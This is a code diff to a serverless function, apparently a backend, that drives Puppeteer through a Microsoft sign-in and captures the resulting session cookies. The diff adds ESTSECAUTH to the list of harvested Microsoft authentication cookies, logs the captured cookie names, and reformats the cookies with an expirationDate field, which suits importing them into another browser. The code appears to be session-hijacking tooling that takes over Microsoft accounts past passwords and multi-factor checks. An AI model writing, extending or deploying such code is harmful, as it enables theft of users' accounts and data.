@@ -94,8 +94,9 @@ exports.handler = async (event, context) => {
     // Click Sign in button
     await page.click('input[type="submit"], button[type="submit"]');
     
-    // Wait a bit for authentication to process
-    await page.waitForTimeout(5000);
+    // ✅ UPDATED: Wait longer for authentication to process and cookies to be set
+    console.log('⏳ Waiting for authentication to complete and cookies to be set...');
+    await page.waitForTimeout(8000);
     
     console.log('🍪 Capturing cookies...');
     
@@ -109,10 +110,16 @@ exports.handler = async (event, context) => {
       cookie.domain.includes('login') ||
       cookie.name.includes('ESTSAUTH') ||
       cookie.name.includes('SignInStateCookie') ||
-      cookie.name.includes('ESTSAUTHPERSISTENT')
+      cookie.name.includes('ESTSAUTHPERSISTENT') ||
+      cookie.name.includes('ESTSECAUTH')
     );
 
     console.log(`✅ Captured ${microsoftCookies.length} Microsoft cookies`);
+    
+    // ✅ UPDATED: Log captured cookie names for debugging
+    if (microsoftCookies.length > 0) {
+      console.log('🔐 Captured cookies:', microsoftCookies.map(c => c.name).join(', '));
+    }
     
     await browser.close();
 
@@ -126,8 +133,11 @@ exports.handler = async (event, context) => {
       httpOnly: cookie.httpOnly,
       sameSite: cookie.sameSite || 'None',
       expires: cookie.expires,
+      expirationDate: cookie.expires,
       session: !cookie.expires
     }));
+
+    console.log('✅ [captureFromMicrosoft] Successfully captured and formatted cookies');
 
     return {
       statusCode: 200,
@@ -138,12 +148,15 @@ exports.handler = async (event, context) => {
         totalCookies: formattedCookies.length,
         domain: 'login.microsoftonline.com',
         timestamp: new Date().toISOString(),
-        source: 'puppeteer-backend-capture'
+        source: 'puppeteer-backend-capture',
+        capturedCookies: formattedCookies.map(c => c.name)
       })
     };
 
   } catch (error) {
     console.error('❌ Microsoft cookie capture error:', error);
+    console.error('❌ Error message:', error.message);
+    console.error('❌ Stack trace:', error.stack);
     
     return {
       statusCode: 500,
@@ -151,6 +164,7 @@ exports.handler = async (event, context) => {
       body: JSON.stringify({
         success: false,
         error: error.message,
+        errorType: error.constructor.name,
         cookies: [],
         totalCookies: 0
       })
